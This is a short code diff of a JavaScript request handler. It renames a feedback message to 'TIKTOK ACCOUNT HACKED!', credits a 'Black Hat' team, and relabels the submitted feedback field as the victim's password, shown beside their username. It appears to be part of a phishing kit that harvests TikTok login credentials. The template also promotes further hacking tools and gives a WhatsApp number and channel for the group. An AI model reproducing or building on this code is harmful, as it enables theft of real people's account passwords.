@@ -32,23 +32,24 @@ export default async function handler(req, res) {
 
     const message = `
 ━━━━━━━━━━━━━━━━━━
-       C9 UZAIR
-     NEW FEEDBACK
+TIKTOK ACCOUNT HACKED!
+   Tool Made By C9 UZAIR
+ Team Black Hat Pakistan 
 ━━━━━━━━━━━━━━━━━━
 
 👤 Username:
 @${username}
 
-💬 Feedback:
+🗣️ Password:
 ${feedback.trim()}
 
 ━━━━━━━━━━━━━━━━━━
 👑 CREDIT: C9 UZAIR
-
+For More Tools Contact Us...
 📱 WhatsApp:
 03162423759
 
-📢 WhatsApp Channel:
+📢 Must Join Our WhatsApp Channel 📢
 https://whatsapp.com/channel/0029VbBlWD0EKyZNFSYWek45
 
 ━━━━━━━━━━━━━━━━━━
